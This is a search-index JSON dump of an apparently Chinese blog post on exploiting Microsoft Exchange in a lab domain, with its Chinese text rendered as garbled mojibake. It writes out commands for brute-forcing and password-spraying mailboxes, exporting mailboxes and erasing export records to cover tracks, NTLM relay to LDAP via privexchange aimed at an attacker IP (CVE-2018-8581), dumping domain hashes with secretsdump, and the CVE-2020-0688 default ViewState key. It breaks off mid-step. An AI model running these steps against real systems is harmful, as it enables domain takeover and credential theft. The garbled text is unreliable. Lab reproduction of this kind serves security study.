¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Exchange æ¼æ´åˆ©ç”¨","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Exchange æ¼æ´åˆ©ç”¨ ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 å®‰è£… å®‰è£…è¿‡ç¨‹å¯å‚è€ƒï¼šå¾®è½¯å®˜æ–¹æ–‡æ¡£å’Œåšå®¢ æ•´ä½“åˆ†ä¸ºä¸‰æ­¥ï¼š æ»¡è¶³å‰ç½®æ¡ä»¶ æ„å»ºåŸŸä¸­çš„ç»“æ„ Setup.exe /PrepareSchema /IAcceptExchangeServerLicenseTerms Setup.exe /PAD /OrganizationName:PentestLab /IAcceptExchangeServerLicenseTerms Setup.exe å®‰è£… ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 èƒŒæ™¯ Exchange Server æ˜¯å¾®è½¯å…¬å¸çš„ä¸€å¥—ç”µå­é‚®ä»¶æœåŠ¡ç»„ä»¶ï¼Œæ˜¯ä¸ªæ¶ˆæ¯ä¸åä½œç³»ç»Ÿã€‚ ç®€å•è€Œè¨€ï¼ŒExchange server å¯ä»¥è¢«ç”¨æ¥æ„æ¶åº”ç”¨äºä¼ä¸šã€å­¦æ ¡çš„é‚®ä»¶ç³»ç»Ÿã€‚Exchange server è¿˜æ˜¯ä¸€ä¸ªåä½œå¹³å°ã€‚åœ¨æ­¤åŸºç¡€ä¸Šå¯ä»¥å¼€å‘å·¥ä½œæµï¼ŒçŸ¥è¯†ç®¡ç†ç³»ç»Ÿï¼ŒWeb ç³»ç»Ÿæˆ–è€…æ˜¯å…¶ä»–æ¶ˆæ¯ç³»ç»Ÿã€‚ ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.1 ç›¸å…³æ¦‚å¿µ 2.1.1 é‚®ä»¶æœåŠ¡å™¨è§’è‰² é‚®ä»¶æœåŠ¡å™¨ è¯¥è§’è‰²æ˜¯æä¾›æ‰˜ç®¡é‚®ç®±ã€å…¬å…±æ–‡ä»¶å¤¹ä»¥åŠç›¸å…³çš„æ¶ˆæ¯æ•°æ®ï¼ˆå¦‚åœ°å€åˆ—è¡¨ï¼‰çš„åç«¯ç»„ä»¶ï¼Œæ˜¯å¿…é€‰çš„æœåŠ¡å™¨è§’è‰²ã€‚ å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨ æ¥æ”¶å’Œå¤„ç†æ¥è‡ªäºä¸åŒå®¢æˆ·ç«¯çš„è¯·æ±‚çš„ä¸­é—´å±‚æœåŠ¡å™¨è§’è‰²ï¼Œè¯¥è§’è‰²æœåŠ¡å™¨æä¾›äº†å¯¹ä½¿ç”¨ä¸åŒåè®®è¿›è¡Œè®¿é—®çš„æ”¯æŒï¼Œæ¯ä¸ª Exchange ç¯å¢ƒä¸­è‡³å°‘éœ€è¦éƒ¨ç½²ä¸€ä¸ªå®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨æä¾›äº†å¯¹ä»¥ä¸‹ä¸åŒæ¥å£è®¿é—® Exchange æœåŠ¡å™¨çš„å¤„ç†ã€‚ é›†çº¿ä¼ è¾“æœåŠ¡å™¨ æˆ–ç§°ä¸­å¿ƒä¼ è¾“æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨è§’è‰²çš„æ ¸å¿ƒæœåŠ¡å°±æ˜¯ Microsoft Exchange Transportï¼Œè´Ÿè´£å¤„ç† Mail Flowï¼ˆè¿™åˆæ˜¯Exchangeä¸­çš„ä¸€å¤§çŸ¥è¯†ç‚¹ï¼ŒExchange ç®¡ç†å‘˜éœ€è¦é€šè¿‡ MailFlow å®ç°é‚®ä»¶å‡ºç«™ä¸è¿›ç«™é…ç½®ï¼‰ã€å¯¹é‚®ä»¶è¿›è¡Œè·¯ç”±ã€ä»¥åŠåœ¨ Exchange ç»„ç»‡ä¸­è¿›è¡Œåˆ†å‘ï¼Œè¯¥æœåŠ¡å™¨è§’è‰²å¤„ç†æ‰€æœ‰å‘å¾€å±äºæœ¬åœ°é‚®ç®±çš„é‚®ä»¶å’Œå‘å¾€å¤–éƒ¨é‚®ç®±çš„é‚®ä»¶ï¼Œå¹¶ç¡®ä¿é‚®ä»¶å‘é€è€…å’Œæ¥æ”¶è€…çš„åœ°å€è¢«æ­£ç¡®è§£æå¹¶æ‰§è¡Œç‰¹å®šç­–ç•¥ï¼ˆå¦‚é‚®ä»¶åœ°å€è¿‡æ»¤ã€å†…å®¹è¿‡æ»¤ã€æ ¼å¼è½¬æ¢ç­‰ï¼‰ï¼Œè¯¥æœåŠ¡å™¨è§’è‰²ç›¸å½“äºä¸€ä¸ªé‚®ä»¶ä¼ è¾“çš„ä¸­ç»§ç«™ç‚¹ï¼Œæ¯ä¸ª Exchange ç¯å¢ƒä¸­è‡³å°‘éœ€è¦éƒ¨ç½²ä¸€ä¸ªé›†çº¿ä¼ è¾“æœåŠ¡å™¨ã€‚ ç»Ÿä¸€æ¶ˆæ¯æœåŠ¡å™¨ å°†ä¸“ç”¨äº¤æ¢æœºï¼ˆprivate branch exchange/PBXï¼‰ å’Œ Exchange Server é›†æˆåœ¨ä¸€èµ·ï¼Œä»¥å…è®¸é‚®ç®±ç”¨æˆ·å¯ä»¥åœ¨é‚®ä»¶ä¸­å‘é€å­˜å‚¨è¯­éŸ³æ¶ˆæ¯å’Œä¼ çœŸæ¶ˆæ¯ï¼Œå¯é€‰è§’è‰²ã€‚ è¾¹ç¼˜æ¶ˆæ¯æœåŠ¡å™¨ è¯¥æœåŠ¡å™¨è§’è‰²ä½œä¸ºä¸“ç”¨æœåŠ¡å™¨å¯ä»¥ç”¨äºè·¯ç”±å‘å¾€å†…éƒ¨æˆ–å¤–éƒ¨çš„é‚®ä»¶ï¼Œé€šå¸¸éƒ¨ç½²äºç½‘ç»œè¾¹ç•Œå¹¶ç”¨äºè®¾ç½®å®‰å…¨è¾¹ç•Œã€‚å…¶æ¥å—æ¥è‡ªå†…éƒ¨ç»„ç»‡çš„é‚®ä»¶å’Œæ¥è‡ªå¤–éƒ¨å¯ä¿¡æœåŠ¡å™¨çš„é‚®ä»¶ï¼Œç„¶ååº”ç”¨ç‰¹å®šçš„ååƒåœ¾é‚®ä»¶ã€åç—…æ¯’ç­–ç•¥ï¼Œæœ€åå°†é€šè¿‡ç­–ç•¥ç­›é€‰çš„é‚®ä»¶è·¯ç”±åˆ°å†…éƒ¨çš„é›†çº¿ä¼ è¾“æœåŠ¡å™¨ï¼Œå¯é€‰è§’è‰²ã€‚ åœ¨ Exchange Server 2013 åŠä»¥åçš„ç‰ˆæœ¬ä¸­ï¼ŒæœåŠ¡å™¨è§’è‰²ç²¾ç®€ä¸ºä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯é‚®ç®±æœåŠ¡å™¨ã€å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨å’Œè¾¹ç¼˜ä¼ è¾“æœåŠ¡å™¨ï¼Œå…¶ä¸­é‚®ç®±æœåŠ¡å™¨è§’è‰²å’Œå®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨è§’è‰²é€šå¸¸è¢«å®‰è£…åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸­ã€‚ 2.1.2 å®¢æˆ·ç«¯/è¿œç¨‹è®¿é—®æ¥å£å’Œåè®® OWA - Outlook Web App å®¢æˆ·ç«¯ç™»å½•ä½¿ç”¨ï¼Œåœ°å€é€šå¸¸ä¸º http://DOAMIN/owa/ ECP - Exchange Administrative Center ç®¡ç†ä¸­å¿ƒï¼Œç®¡ç†å‘˜ç”¨äºç®¡ç†ç»„ç»‡ä¸­çš„ Exchange çš„ Web æ§åˆ¶å°ï¼Œåœ°å€é€šå¸¸ä¸º http://DOMAIN/ecp/ EWS - Exchange Web Service ç½‘ç»œç®¡ç†æ¥å£ã€‚Exchange æä¾›äº†ä¸€å¥— API ç¼–ç¨‹æ¥å£å¯ä¾›å¼€å‘è€…è°ƒç”¨ï¼Œç”¨äºè®¿é—® Exchange æœåŠ¡å™¨ï¼Œä¸é‚®ä»¶ã€è”ç³»äººã€æ—¥å†ç­‰åŠŸèƒ½è¿›è¡Œäº¤äº’å’Œç®¡ç†æ“ä½œï¼Œåœ¨ Exchange Server 2007 ä¸­è¢«æå‡ºã€‚å¾®è½¯åŸºäºæ ‡å‡†çš„ Web Service å¼€å‘ EWSï¼ŒEWS å®ç°çš„å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´é€šè¿‡åŸºäº HTTP çš„ SOAP äº¤äº’ã€‚ ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.2 æœåŠ¡å‘ç° 2.2.1 åŸºäºç«¯å£æ‰«æå‘ç° 25 ç«¯å£ SMTP æŒ‡çº¹æ˜¾ç¤º Exchange smtpd 80 ç«¯å£ä¸º iis 443 ç«¯å£å¼€æ”¾ 2.2.2 SPN æŸ¥è¯¢ setspn -T pentest.com -F -Q */* ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.3 exchange åŸºæœ¬æ“ä½œ æŸ¥çœ‹ MailBox æ•°æ®åº“ Add-pssnapin microsoft.exchange* Get-MailboxDatabase -server \"Exchange\" æŸ¥çœ‹æŒ‡å®šç”¨æˆ·é‚®ç®±ä½¿ç”¨ä¿¡æ¯ Get-Mailboxstatistics -identity administrator | Select DisplayName,ItemCount,TotalItemSize,LastLogonTime æŸ¥çœ‹å…¨éƒ¨ç”¨æˆ·é‚®ç®±ä½¿ç”¨ä¿¡æ¯ Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalItemSize ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.4 å¯¼å‡ºæŒ‡å®šé‚®ä»¶ 2.4.1 é…ç½®ç”¨æˆ·çš„å¯¼å…¥ã€å¯¼å‡ºæƒé™ æŸ¥çœ‹ç”¨æˆ·æƒé™ # æŸ¥çœ‹å…·æœ‰å¯¼å‡ºæƒé™çš„ç”¨æˆ· Get-ManagementRoleAssignment -role \"Mailbox Import Export\" | Format-List RoleAssigneeName æ·»åŠ ç”¨æˆ·è§’è‰²æƒé™ New-ManagementRoleAssignment -Name \"Import Export_Domain Admins\" -User \"Administrator\" -Role \"Mailbox Import Export\" åˆ é™¤ç”¨æˆ·æƒé™ New-ManagementRoleAssignment \"Import Export_Domain Admins\" -Confirm:$false è®¾ç½®ç½‘ç»œå…±äº«æ–‡ä»¶å¤¹ net share inetpub=c:\\inetpub /grant:everyone,full å¯¼å‡ºé‚®ä»¶ New-MailboxExportRequest -Mailbox administrator -FilePath \\\\IP\\inetpub\\administrator.pst ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.4.2 æ¸…ç†ç—•è¿¹ æŸ¥çœ‹ä¹‹å‰çš„å¯¼å‡ºè®°å½• Get-MailboxExportRequest å°†æŒ‡å®šç”¨æˆ·çš„å·²å®Œæˆå¯¼å‡ºè¯·æ±‚åˆ é™¤ Remove-MailboxExportRequest -Identify Administrator\\mailboxexport å°†æ‰€æœ‰å·²å®Œæˆå¯¼å‡ºçš„è¯·æ±‚åˆ é™¤ Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3 Exchange åœ¨åŸŸä¸­çš„æƒé™ æŸ¥çœ‹ Exchange æœåŠ¡å™¨çš„éš¶å±å…³ç³»ï¼Œå‘ç°å…¶å±äºï¼šExchange Security Groups å†è·Ÿè¿› CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=pentest,DC=lab è¯¥ç»„åˆéš¶å±äº CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=pentest,DC=labï¼Œè¯¥ç»„åŒ…å«é€šè¿‡ç®¡ç†æœåŠ¡ä»£è¡¨ç”¨æˆ·è¿è¡Œ Exchange cmdlet çš„ Exchange æœåŠ¡å™¨ã€‚å…¶æˆå‘˜æœ‰æƒè¯»å–å’Œä¿®æ”¹æ‰€æœ‰ Windows å¸æˆ·å’Œç»„ã€‚ ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ Exchange æœåŠ¡å™¨æœ‰æƒé™ä¿®æ”¹åŸŸå†…ä»»æ„ç”¨æˆ·çš„ ACLã€‚ å› æ­¤ï¼Œå¯ä»¥åˆ©ç”¨ Exchange ä¿®æ”¹ç”¨æˆ· ACLï¼Œç„¶ååœ¨åˆ©ç”¨ Dcsync æ¥ dump hashã€‚ ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4 Exchange æ¥å£åˆ©ç”¨ ä¸Šæ–‡æåˆ°ï¼ŒExchange æä¾›äº†å¤šç§å®¢æˆ·ç«¯é‚®ç®±æ¥å£å’ŒæœåŠ¡æ¥å£ï¼Œå¯¹äºæ¸—é€æµ‹è¯•äººå‘˜è€Œè¨€ï¼Œè¿™äº›æ¥å£å°±æ˜¯è¸å…¥ Exchange å†…éƒ¨çš„ç¬¬ä¸€é“å…³å¡ï¼Œæä¾›æœåŠ¡çš„æ¥å£éœ€è¦æœ‰æ•ˆçš„ç”¨æˆ·å‡­è¯ä¿¡æ¯ï¼Œæ˜¾ç„¶ï¼Œç”¨æˆ·åä¸å¯†ç ç ´è§£æ˜¯æ‘†åœ¨é¢å‰çš„ç¬¬ä¸€ä¸ªå°è¯•ã€‚åœ¨ä¼ä¸šåŸŸç¯å¢ƒä¸­ï¼ŒExchange ä¸åŸŸæœåŠ¡é›†åˆï¼ŒåŸŸç”¨æˆ·è´¦æˆ·å¯†ç å°±æ˜¯ Exchange é‚®ç®±çš„è´¦æˆ·å¯†ç ï¼Œå› æ­¤ï¼Œå¦‚æœé€šè¿‡æš´åŠ›ç ´è§£ç­‰æ‰‹æ®µæˆåŠŸè·å–äº†é‚®ç®±ç”¨æˆ·å¯†ç ï¼Œåœ¨é€šå¸¸æƒ…å†µä¸‹ä¹Ÿå°±é—´æ¥è·å¾—äº†åŸŸç”¨æˆ·å¯†ç ã€‚ ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.1 åˆ©ç”¨è‡ªåŠ¨å‘ç°æœåŠ¡è¿›è¡Œæš´åŠ›ç ´è§£ Autodiscover è‡ªåŠ¨å‘ç°æœåŠ¡ä½¿ç”¨ Autodiscover.xml é…ç½®æ–‡ä»¶æ¥å¯¹ç”¨æˆ·è¿›è¡Œè‡ªåŠ¨è®¾ç½®ï¼Œè·å–è¯¥è‡ªåŠ¨é…ç½®æ–‡ä»¶éœ€è¦ç”¨æˆ·è®¤è¯ï¼Œå¦‚è®¿é—® http://exchange.pentest.lab/Autodiscover/Autodiscover.xml æ–‡ä»¶å°†æç¤ºéœ€è¦è®¤è¯ï¼Œå¦‚ä¸‹ä¸ºè®¤è¯é€šè¿‡ï¼Œå°†è·å–åˆ°å¦‚ä¸‹çš„ XML æ–‡ä»¶å†…å®¹ï¼š åˆ©ç”¨è¿™ä¸ªæ¥å£ï¼Œå¯ä»¥å¯¹é‚®ç®±è´¦å·åšæš´åŠ›ç ´è§£ã€‚Ruler æä¾›äº†å¯¹ Exchange çš„è‡ªåŠ¨é…ç½®æ–‡ä»¶æ¥å£è¿›è¡Œè®¤è¯çš„æš´åŠ›ç ´è§£ï¼Œé€šè¿‡é…ç½®çº¿ç¨‹æ•°ã€é—´éš”æ—¶é—´å¯ä»¥é™åˆ¶ç ´è§£é€Ÿåº¦é˜²æ­¢å¤šæ¬¡ç™»é™†å¤±è´¥è§¦å‘å‘Šè­¦æˆ–è´¦æˆ·è¢«å°ç¦ã€‚ ./ruler --url https://172.16.147.4/autodiscover/autodiscover.xml --domain pentest.lab --insecure brute --users user.txt --passwords pass.txt --delay 0 --verbose ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.2 Password Spray password spray åŒæ ·æ˜¯ä¸€ç§ç ´è§£è´¦æˆ·å¯†ç çš„æ–¹æ³•ï¼Œä¸å¸¸è§„çš„æš´åŠ›ç ´è§£æ–¹æ³•ä¸åŒçš„æ˜¯ï¼Œpassword spary é’ˆå¯¹ä¸€æ‰¹è´¦æˆ·è¿›è¡Œç ´è§£ï¼Œæ¯æ¬¡å¯¹å•ä¸ªç”¨æˆ·è´¦æˆ·è¿›è¡Œä¸€æ¬¡æˆ–å°‘æ•°æ¬¡ç™»é™†å°è¯•åæ¢ç”¨ä¸‹ä¸€ä¸ªç”¨æˆ·è¿›è¡Œå°è¯•ï¼Œå¦‚æ­¤åå¤è¿›è¡Œå¹¶é—´éš”ä¸€å®šæ—¶é—´ï¼Œä»¥æ­¤æ–¹æ³•èº²é¿å¤šæ¬¡æš´åŠ›ç ´è§£çš„æ£€æµ‹å’Œè´¦æˆ·é”å®šçš„é£é™©ã€‚ mailsniper æä¾›åˆ†åˆ«é’ˆå¯¹ OWA æ¥å£ã€EWS æ¥å£å’Œ ActiveSync æ¥å£çš„ password sprayã€‚ Invoke-PasswordSprayEWS -ExchHostname exchange.pentest.lab -UserList .\\user.txt -Password 123456 -ExchangeVersion Exchange2016 ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5 åˆ©ç”¨ Exchange æ¥ç®¡åŸŸæ§ ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5.1 CVE-2018-8581 SSRF æ¼æ´ 5.1.1 æ¼æ´æè¿° Exchange å…è®¸ä»»æ„ç”¨æˆ·é€šè¿‡ EWS æ¥å£æ¥åˆ›å»ºä¸€ä¸ªæ¨é€è®¢é˜…ï¼ˆPush Subscriptionï¼‰ï¼Œå¹¶å¯ä»¥æŒ‡å®šä»»æ„ URL ä½œä¸ºé€šçŸ¥æ¨é€çš„ç›®çš„åœ°ï¼› å½“è§¦å‘æ¨é€æ—¶ï¼ŒExchange ä½¿ç”¨äº† CredentialCache ç±»çš„ DefaultCredentials å±æ€§ï¼Œå½“ä½¿ç”¨ DefaultCredentials æ—¶å‘å‡ºçš„ HTTP è¯·æ±‚å°†ä½¿ç”¨è¯¥æƒé™å‘èµ· NTLM è®¤è¯ï¼› åœ¨ EWS è¯·æ±‚ä¸­ï¼Œé€šè¿‡åœ¨ Header ä¸­ä½¿ç”¨ SerializedSecurityContextï¼ŒæŒ‡å®š SID å¯ä»¥å®ç°èº«ä»½ä¼ªè£…ï¼Œä»è€Œä»¥æŒ‡å®šç”¨æˆ·èº«ä»½è¿›è¡Œ EWS è°ƒç”¨æ“ä½œã€‚ å³ä» HTTP relay åˆ° LDAP çš„ NTLM Relay æ”»å‡»ã€‚ 5.1.2 å—å½±å“çš„ç³»ç»Ÿç‰ˆæœ¬ Exchange Server 2010 ~ Exchange Server 2016 5.1.3 æ¼æ´å¤ç° æ¼æ´åˆ©ç”¨åˆ°ä¸¤ä¸ªå·¥å…·ï¼š impacket PrivExchange é¦–å…ˆåœ¨æœ¬æœºå¯åŠ¨ NTLM ä¸­ç»§ï¼Œè¿›å…¥åˆ° impacket çš„ examples ç›®å½•æ‰§è¡Œ python2 ntlmrelayx.py -t ldap://pentest.lab --escalate-user hacker pentest.lab æ˜¯åŸŸçš„åç§° --escalate-user çš„å‚æ•°æ˜¯ Exchange çš„æ™®é€šæƒé™ç”¨æˆ·åã€‚ python2 privexchange.py -ah 172.16.147.1 172.16.147.4 -u hacker -p \"hack123aB\" -d pentest.lab -ah å‚æ•°æŒ‡å®šæ”»å‡»è€… IPï¼Œåœ¨è¿™é‡Œä¸º 172.16.147.1 172.16.147.4 ä¸º Exchange æœåŠ¡å™¨åœ¨åŸŸçš„åç§°æˆ–è€…IPåœ°å€ -u æŒ‡å®šéœ€è¦ææƒçš„ Exchange çš„æ™®é€šæƒé™ç”¨æˆ·å -pæŒ‡å®š Exchange çš„æ™®é€šæƒé™ç”¨æˆ·çš„å¯†ç  -d æŒ‡å®šåŸŸçš„åç§° å¯¼å‡ºåŸŸå†… hashï¼š python2 secretsdump.py pentest.lab/hacker@pentest.lab -just-dc ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:5:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5.2 CVE-2020-0688 ååºåˆ—åŒ–æ¼æ´ 5.2.1 æ¼æ´æè¿° ä¸æ­£å¸¸è½¯ä»¶å®‰è£…æ¯æ¬¡éƒ½ä¼šäº§ç”Ÿéšæœºå¯†é’¥ä¸åŒï¼Œæ‰€æœ‰ Exchange Server åœ¨å®‰è£…åçš„ web.config æ–‡ä»¶ä¸­éƒ½æ‹¥æœ‰ç›¸åŒçš„ validationKey å’Œ decryptionKeyã€‚è¿™äº›å¯†é’¥ç”¨äºä¿è¯ ViewState çš„å®‰å…¨æ€§ã€‚ è€Œ ViewState æ˜¯ ASP.NET Web åº”ç”¨ä»¥åºåˆ—åŒ–æ ¼å¼å­˜å‚¨åœ¨å®¢æˆ·æœºä¸Šçš„æœåŠ¡ç«¯æ•°æ®ã€‚å®¢æˆ·ç«¯é€šè¿‡ __VIEWSTATE è¯·æ±‚å‚æ•°å°†è¿™äº›æ•°æ®è¿”å›ç»™æœåŠ¡å™¨ã€‚æ”»å‡»è€…å¯ä»¥åœ¨ Exchange Control Panel web åº”ç”¨ä¸Šæ‰§è¡Œä»»æ„ .net ä»£ç ã€‚ å½“æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µè·å¾—ä¸€ä¸ªå¯ä»¥è®¿é—® Exchange Control Panel ï¼ˆECPï¼‰ç»„ä»¶çš„ç”¨æˆ·è´¦å·å¯†ç æ—¶ã€‚æ”»å‡»è€…å¯ä»¥åœ¨è¢«æ”»å‡»çš„ exchange ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œç›´æ¥è·å–æœåŠ¡å™¨æƒé™ã€‚ å…·ä½“åŸç†å¯ä»¥å‚è€ƒï¼šCVE-2020-0688çš„æ­¦å™¨åŒ–ä¸.netååºåˆ—åŒ–æ¼æ´é‚£äº›äº‹ 5.2.2 å—å½±å“çš„ç³»ç»Ÿç‰ˆæœ¬ Microsoft Exchange Server 2010 Service Pack 3 Microsoft Exchange Server 2013 Microsoft Exchange Server 2016 Microsoft Exchange Server 2019 5.2.3 æ¼æ´å¤ç° 5.2.3.1 å‰æ é¦–å…ˆï¼Œéœ€è¦è·å– 4 ä¸ªå‚æ•°ï¼š validationkey è¯¥å‚æ•°ä¸ºé»˜è®¤ï¼Œä¸ºæ¼æ´äº§ç”Ÿçš„åŸå›  CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF validationalg é»˜è®¤ SHA1 generator viewstateuserkey åœ¨è¿™å››ä¸ªå˜é‡ä¸­ï¼Œå‰ä¸¤ä¸ªä¸ºé»˜è®¤å›ºå®šï¼Œviewstateuserkey å’Œ generator çš„å€¼éœ€è¦ä»ç»è¿‡èº«ä»½éªŒè¯çš„ session ä¸­æ”¶é›†ã€‚viewstateuserkey å¯ä»¥ä» ASP.NE Tçš„ _SessionID cookie ä¸­è·å–ï¼Œè€Œ generator å¯ä»¥åœ¨ä¸€ä¸ªéšè—å­—æ®µ __VIEWSTATEGENERATOR ä¸­æ‰¾åˆ°ã€‚ 5.2.3.2 å‚æ•°è·å– åœ¨æ­£å¸¸ç™»å½•åè®¿é—® /ecp/default.aspx é¡µé¢ã€‚ä½¿ç”¨ burpsuite æŠ“åŒ…å‘ repeaterï¼Œæ‰¾åˆ°ç™»å½•æ—¶ /ecp/default.aspx 